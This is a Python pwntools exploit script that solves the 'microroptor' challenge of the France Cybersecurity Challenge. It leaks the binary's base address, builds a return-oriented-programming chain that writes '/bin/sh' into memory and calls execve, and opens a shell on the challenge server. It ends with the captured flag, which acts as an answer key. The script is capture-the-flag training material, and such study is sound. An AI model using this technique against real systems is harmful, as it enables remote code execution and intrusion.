#!/usr/bin/python3

from pwn import *
context(arch="amd64")

p = remote("challenges.france-cybersecurity-challenge.fr", "2052")
#p = process("./microroptor")


## Use the leak to find binary base address
addrInData = int(p.recvline()[:-1], 16)
log.success("Leak: " + hex(addrInData))

baseAddr = addrInData - 0x4010
log.success("Base address of the binary is: " + hex(baseAddr))


## Spot addresses
# Tips: 'ropper -f microroptor' to find most useful common gadgets
# Tips: 'ropper -f microroptor --search "mov [???], ???; ret;' to find write-what-where gadgets

write_raxContent_at_rdiAddr =	baseAddr + 0x1169 # "mov qword ptr [rdi], rax; ret;" --> useful to perform the write-what-where to write /bin/sh!

pop_rax_gadget = 		baseAddr + 0x116d
pop_rdi_gadget = 		baseAddr + 0x116f
pop_rsi_pop_r15_gadget = 	baseAddr + 0x1249 # couldn't find a simple "pop rsi; ret" gadget ;)
pop_rdx_gadget = 		baseAddr + 0x1171
syscall_gadget = 		baseAddr + 0x1173


## Construct ROP chain

payload = b"A"*40   # 32 bytes to fill buffer + 8 bytes to fill saved RBP = 40 to start overwriting saved RIP

# 1 - Write '/bin/sh' somewhere

payload += p64(pop_rax_gadget)
payload += p64(0x0068732f6e69622f) # pop "/bin/sh\0" (in little-endian) to RAX

payload += p64(pop_rdi_gadget)
payload += p64(addrInData) # the leaked address is an address in .data --> so we can write our string '/bin/sh\0' there!

payload += p64(write_raxContent_at_rdiAddr) # perform the write-what-where

# 2 - execve('/bin/sh', 0, 0)

payload += p64(pop_rax_gadget)
payload += p64(0x3b) # pop 0x3b to RAX

payload += p64(pop_rdi_gadget)
payload += p64(addrInData) # pop the address where we wrote '/bin/sh'

payload += p64(pop_rsi_pop_r15_gadget)
payload += p64(0x0) # pop 0 to RSI
payload += p64(0x0) # pop 0 to R15 (we don't care about this register)

payload += p64(pop_rdx_gadget)
payload += p64(0x0) # pop 0 to RDX

payload += p64(syscall_gadget) # jump to the syscall gadget

p.sendline(payload)
p.interactive()

# Flag is: FCSC{e3752da07f2c9e3a0f9ad69679792e5a8d53ba717a2652e29fb975fcf36f9258}!!!
